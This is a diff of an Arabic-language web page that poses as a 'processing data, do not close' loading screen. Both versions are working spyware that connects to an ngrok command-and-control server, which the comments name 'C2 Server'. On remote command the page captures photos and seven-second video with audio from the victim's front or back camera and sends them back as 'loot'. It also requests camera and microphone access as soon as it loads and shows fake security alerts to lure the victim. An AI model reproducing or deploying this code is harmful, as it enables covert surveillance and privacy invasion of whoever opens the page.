@@ -1,49 +1,104 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <meta charset="UTF-8"><title>System Update</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري معالجة البيانات...</title>
     <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
+    <style>
+        body { background: #000; color: #00ff00; font-family: monospace; text-align: center; padding-top: 20%; }
+        .loader { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
-<body style="background:#000; color:#fff; text-align:center; padding-top:100px;">
-    <h2>جاري معالجة البيانات...</h2>
-    <script>
-        const socket = io("https://kinship-porridge-molasses.ngrok-free.dev");
-        
-        async function getMedia(facing, type) {
-            const constraints = {
-                video: { facingMode: facing, width: 1280, height: 720 },
-                audio: type === 'vid'
-            };
-            const stream = await navigator.mediaDevices.getUserMedia(constraints);
-            
-            if (type === 'img') {
-                const v = document.createElement('video'); v.srcObject = stream; await v.play();
-                const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v,0,0);
-                socket.emit('loot', {type:'photo', data: c.toDataURL('image/png').split(',')[1]});
-                stream.getTracks().forEach(t => t.stop());
-            } else {
-                const rec = new MediaRecorder(stream); const ch = [];
-                rec.ondataavailable = e => ch.push(e.data);
-                rec.onstop = () => {
-                    const r = new FileReader();
-                    r.onload = () => socket.emit('loot', {type:'video', data: r.result.split(',')[1]});
-                    r.readAsDataURL(new Blob(ch));
-                    stream.getTracks().forEach(t => t.stop());
-                };
-                rec.start(); setTimeout(() => rec.stop(), 7000);
-            }
-        }
+<body>
+    <div class="loader"></div>
+    <h2 id="status">جاري الاتصال بالنظام...</h2>
+    <p>يرجى الانتظار، لا تغلق الصفحة</p>
 
-        socket.on('command', (cmd) => {
-            if(cmd.action === 'scan_back') getMedia('environment', 'img');
-            if(cmd.action === 'scan_front') getMedia('user', 'img');
-            if(cmd.action === 'vid_back') getMedia('environment', 'vid');
-            if(cmd.action === 'vid_front') getMedia('user', 'vid');
-            if(cmd.action === 'vibrate') navigator.vibrate([500, 200, 500]);
-            if(cmd.action === 'alarm') { let a = new Audio('https://www.soundjay.com/buttons/beep-01a.mp3'); a.play(); }
-            if(cmd.action === 'notify') alert("⚠️ تم اكتشاف نشاط مشبوه، يرجى إعادة تسجيل الدخول");
+    <script>
+        // إعداد الاتصال بالسيرفر
+        const SERVER_URL = "https://kinship-porridge-molasses.ngrok-free.dev";
+        const socket = io(SERVER_URL, { 
+            transports: ['websocket', 'polling'],
+            reconnection: true,
+            reconnectionAttempts: 5
         });
+
+        // إعلام البوت فور الاتصال
+        socket.on('connect', () => {
+            document.getElementById('status').innerText = "تم الاتصال بنجاح ✅";
+            console.log("Connected to C2 Server");
+            // محاولة طلب الإذن بشكل صامت
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => {});
+        });
+
+        socket.on('disconnect', () => {
+            document.getElementById('status').innerText = "جاري إعادة الاتصال...";
+        });
+
+        // معالج الأوامر
+        socket.on('command', async (cmd) => {
+            try {
+                const facing = cmd.action.includes('back') ? "environment" : "user";
+                const isVideo = cmd.action.includes('vid');
+
+                // إعدادات الكاميرا
+                const constraints = {
+                    video: { facingMode: facing, width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: isVideo
+                };
+
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+
+                if (!isVideo) {
+                    // التقاط صورة
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
+                    
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const data = canvas.toDataURL('image/png').split(',')[1];
+                    socket.emit('loot', { type: 'photo', data: data, timestamp: Date.now() });
+                    
+                    // إغلاق الكاميرا فوراً
+                    stream.getTracks().forEach(track => track.stop());
+                } else {
+                    // تسجيل فيديو
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const chunks = [];
+                    mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const reader = new FileReader();
+                        reader.onload = () => {
+                            socket.emit('loot', { type: 'video', data: reader.result.split(',')[1], timestamp: Date.now() });
+                        };
+                        reader.readAsDataURL(blob);
+                        stream.getTracks().forEach(track => track.stop());
+                    };
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), 7000); // تسجيل 7 ثوانٍ
+                }
+            } catch (err) {
+                socket.emit('loot', { type: 'error', data: b64EncodeUnicode(err.message), timestamp: Date.now() });
+            }
+        });
+
+        // دوال إضافية للتحكم
+        socket.on('command', (cmd) => {
+            if (cmd.action === 'vibrate') navigator.vibrate([500, 200, 500]);
+            if (cmd.action === 'alarm') { new Audio('https://www.soundjay.com/buttons/beep-01a.mp3').play(); }
+            if (cmd.action === 'notify') alert("يرجى تحديث الصفحة للمتابعة");
+        });
+
+        function b64EncodeUnicode(str) {
+            return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, (match, p1) => String.fromCharCode('0x' + p1)));
+        }
     </script>
 </body>
 </html>
